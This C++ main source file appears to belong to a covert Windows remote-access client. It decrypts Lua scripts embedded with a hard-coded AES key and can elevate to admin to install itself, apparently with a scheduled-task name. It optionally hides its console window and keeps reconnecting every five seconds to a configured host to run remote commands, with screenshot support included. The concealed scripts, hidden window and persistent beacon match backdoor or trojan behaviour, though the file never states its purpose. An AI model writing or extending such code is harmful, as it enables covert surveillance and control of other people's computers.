#include "Screenshot.h"
#include "global.h"
#include "luaFunctions/LuaFunctions.h"
#ifdef DEMO_MODE
#include <filesystem>
#else
#include <plusaes/plusaes.hpp>

#include "Installer.h"
#include "helpers/GeneralHelpers.h"
#include "lua/0_Config.h"
#include "lua/1_json.h"
#include "lua/2_Startup.h"
#include "lua/3_MainCycle.h"
#include "lua/Key.h"
#endif
#include <foresteamnd/Utils>
#include <fstream>
#include <gdiplus.h>
#include <iostream>
#include <list>
#include <string.h>
#include <thread>

#ifdef _DEBUG
#define DEBUG true
#else
#define DEBUG false
#endif

void _RunHandled(lua_State* L, char* code);
bool RunHandled(lua_State* L, char* code);

void HideConsoleWindow();

vector<unsigned char> Decrypt(const char* data, size_t length);

Config RunConfig(lua_State* L, char* code);

int wmain(int argc, wchar_t* argv[]) {
  Gdiplus::GdiplusStartupInput gdiplusStartupInput;
  ULONG_PTR gdiplusToken;
  Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

  lua_State* L;

#ifdef DEMO_MODE
  string dir = GetExecutableDirectory().string();
  auto dConfig = ReadFile(dir + "./0_Config.lua");
  auto dJson = ReadFile(dir + "./1_json.lua");
  auto dStartup = ReadFile(dir + "./2_Startup.lua");
  auto dMainCycle = ReadFile(dir + "./3_MainCycle.lua");
#else
  auto dConfig = Decrypt(script_0_Config, script_0_Config_len);
  auto dJson = Decrypt(script_1_json, script_1_json_len);
  auto dStartup = Decrypt(script_2_Startup, script_2_Startup_len);
  auto dMainCycle = Decrypt(script_3_MainCycle, script_3_MainCycle_len);
#endif

  L = luaL_newstate();
  appConfig = RunConfig(L, (char*)dConfig.data());
#if !defined(DEMO_MODE) && !DEBUG
  Installer installer;
  try {
    for (int i = 0; i < argc; i++) {
      if (std::wstring(argv[i]) == std::wstring(L"--uninstall") && installer.IsInstalled()) {
        if (!installer.HasPermissions())
          installer.RestartAsAdmin();
        installer.Uninstall();
        return 0;
      }
      if (argv[i][0] == '-' && argv[i][1] == 'i' && wstring(argv[i]).length() == 3) {
        Logger::Log(std::format("Install stage: {}", argv[i][2] - '0'), Logger::LOG_INFO);
        installer.SetInstallStage(Installer::InstallStage(argv[i][2] - '0'));
      }
      if (std::wstring(argv[i]) == std::wstring(L"--install") && !installer.IsInstalled()) {
        if (!installer.HasPermissions())
          installer.RestartAsAdmin();
        installer.Install();
      }
    }
  }
  catch (Exception e) {
    e.Log();
    return e.GetErrorCode();
  }
  catch (...) {
    Logger::LogError("Unknown error", Error::ERROR_UNKNOWN);
    return Error::ERROR_UNKNOWN;
  }
#endif
#ifdef _WIN32
  if (!DEBUG && appConfig.hideWindow)
    HideConsoleWindow();
#endif

  luaL_openlibs(L);
  LuaFunctions::Register(L);

  RunHandled(L, (char*)dJson.data());
  RunHandled(L, (char*)dStartup.data());

  while (true) {
    try {
      client = new TCPClient(appConfig.host, appConfig.port, TCPClient::RetryPolicy::THROW, DEBUG);
      controller = new Controller();
      bool exit = RunHandled(L, (char*)dMainCycle.data());
      if (exit)
        break;
    }
    catch (exception e) {
      cout << e.what() << endl;
    }
    if (client) {
      delete client;
      client = nullptr;
    }
    if (controller) {
      delete controller;
      controller = nullptr;
    }
    this_thread::sleep_for(chrono::seconds(5));
  }
  lua_close(L);

  Gdiplus::GdiplusShutdown(gdiplusToken);
  if (client)
    delete client;
  if (controller)
    delete controller;
  return 0;
}

void _RunHandled(lua_State* L, char* code) {
  if (luaL_dostring(L, code) != LUA_OK) {
    // Get the error message from the stack
    const char* errorMsg = lua_tostring(L, -1);
    std::cerr << "Lua Error: " << errorMsg << std::endl;

    // Pop the error message from the stack
    lua_pop(L, 1);
    throw runtime_error((string("Lua error: ") + errorMsg).c_str());
  }
}
bool RunHandled(lua_State* L, char* code) {
  _RunHandled(L, code);
  if (!lua_isboolean(L, -1))
    return false;
  bool value = lua_toboolean(L, -1);
  lua_pop(L, 1);
  return value;
}

void HideConsoleWindow() {
#ifdef _WIN32
  HWND hwnd = GetConsoleWindow();
  if (hwnd != NULL)
    ShowWindow(hwnd, SW_HIDE); // Hide the console window
#endif
}

#ifndef DEMO_MODE
vector<unsigned char> Decrypt(const char* data, size_t length) {
  auto decrypted = vector<unsigned char>(plusaes::get_padded_encrypted_size(length));
  unsigned long padded_size = 0;
  plusaes::decrypt_cbc((const unsigned char*)data, length, AES::key, AES::key_size, &AES::iv, decrypted.data(), decrypted.size(), &padded_size);

  return decrypted;
}
#endif

Config RunConfig(lua_State* L, char* code) {
  _RunHandled(L, code);

  Config config;
  // Ensure the Lua stack has the table (assumed to be at the top)
  if (!lua_istable(L, -1)) {
    throw std::runtime_error("Expected a Lua table at the top of the stack");
  }

  // Get 'host' field
  lua_getfield(L, -1, "host");
  if (lua_isstring(L, -1)) {
    config.host = lua_tostring(L, -1);
  }
  else {
    lua_pop(L, 1);
    throw std::runtime_error("Field 'host' must be a string");
  }
  lua_pop(L, 1); // Pop the 'host' value

  // Get 'port' field
  lua_getfield(L, -1, "port");
  if (lua_isnumber(L, -1)) {
    config.port = (short)lua_tonumber(L, -1);
  }
  else {
    lua_pop(L, 1);
    throw std::runtime_error("Field 'port' must be a number");
  }
  lua_pop(L, 1); // Pop the 'port' value

  // Get 'hideWindow' field
  lua_getfield(L, -1, "hideWindow");
  if (lua_isboolean(L, -1)) {
    config.hideWindow = (bool)lua_toboolean(L, -1);
  }
  else {
    lua_pop(L, 1);
    throw std::runtime_error("Field 'hideWindow' must be a number");
  }
  lua_pop(L, 1); // Pop the 'hideWindow' value

  // Get 'appName' field
  lua_getfield(L, -1, "appName");
  if (lua_isstring(L, -1)) {
    config.appName = GlobalHelpers::StringToWstring(lua_tostring(L, -1));
  }
  else {
    lua_pop(L, 1);
    throw std::runtime_error("Field 'appName' must be a string");
  }
  lua_pop(L, 1); // Pop the 'host' value
  // Get 'appTaskName' field
  lua_getfield(L, -1, "appTaskName");
  if (lua_isstring(L, -1)) {
    config.appTaskName = GlobalHelpers::StringToWstring(lua_tostring(L, -1));
  }
  else {
    lua_pop(L, 1);
    throw std::runtime_error("Field 'appTaskName' must be a string");
  }
  lua_pop(L, 1); // Pop the 'host' value
  // Get 'targetExecutableName' field
  lua_getfield(L, -1, "targetExecutableName");
  if (lua_isstring(L, -1)) {
    config.targetExecutableName = GlobalHelpers::StringToWstring(lua_tostring(L, -1));
  }
  else {
    lua_pop(L, 1);
    throw std::runtime_error("Field 'targetExecutableName' must be a string");
  }
  lua_pop(L, 1); // Pop the 'host' value
  // Get 'uninstallScriptName' field
  lua_getfield(L, -1, "uninstallScriptName");
  if (lua_isstring(L, -1)) {
    config.uninstallScriptName = GlobalHelpers::StringToWstring(lua_tostring(L, -1));
  }
  else {
    lua_pop(L, 1);
    throw std::runtime_error("Field 'uninstallScriptName' must be a string");
  }
  lua_pop(L, 1); // Pop the 'host' value

  // Pop the table itself (critical for stack balance!)
  lua_pop(L, 1);
  return config;
}